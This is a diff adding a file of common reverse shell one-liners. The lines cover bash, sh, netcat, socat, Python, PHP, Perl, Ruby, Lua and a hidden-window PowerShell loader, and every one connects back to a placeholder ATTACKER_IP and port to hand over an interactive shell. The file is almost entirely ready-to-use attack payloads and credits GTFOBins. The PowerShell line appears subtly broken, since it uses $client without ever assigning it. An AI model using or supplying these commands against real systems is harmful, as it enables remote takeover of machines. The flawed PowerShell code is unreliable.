@@ -1,0 +1,47 @@
+# Common reverse shell one-liners (adjust ATTACKER_IP and ATTACKER_PORT)
+
+# --- POSIX shells ---
+
+# Bash
+bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
+
+# /bin/sh using /dev/tcp (GTFOBins style)
+sh -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
+
+# --- Netcat ---
+
+# Netcat (traditional)
+nc -e /bin/sh ATTACKER_IP ATTACKER_PORT
+
+# Netcat (without -e)
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT > /tmp/f
+
+# --- High-interaction shells (socat) ---
+
+# socat reverse shell (pty, sane TTY) – inspired by GTFOBins
+socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
+
+# --- Scripting languages ---
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
+
+# PHP
+php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Perl
+perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Ruby (GTFOBins style)
+ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",ATTACKER_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Lua (requires socket library)
+lua -e 'local s=require("socket");local t=assert(s.tcp());t:connect("ATTACKER_IP",ATTACKER_PORT);while true do local r,x=t:receive();local h=io.popen(r,"r");local d=h:read("*a");t:send(d);h:close() end'
+
+# --- Windows ---
+
+# PowerShell (Windows)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
+
+# Many of the above are adapted from or inspired by GTFOBins:
+# https://gtfobins.github.io/
